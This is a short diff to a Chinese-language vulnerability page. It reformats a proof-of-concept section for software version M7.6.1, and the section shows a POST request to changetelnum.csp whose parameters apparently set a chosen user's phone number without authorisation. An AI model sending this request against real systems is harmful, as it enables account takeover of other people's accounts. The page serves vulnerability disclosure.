@@ -11,8 +11,9 @@ M7.6.1
 
 ### 漏洞POC
 
-```
+```html
 https://127.0.0.1/por/changetelnum.csp?apiversion=1 
-```POST：```
+POST：
 newtel=TARGET_PHONE&sessReq=clusterd&username=TARGET_USERNAME&grpid=0&sessid=0&ip=127.0.0.1 
-```整体如下： ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/@P0LRSLXDTR7H.png)
+
+```
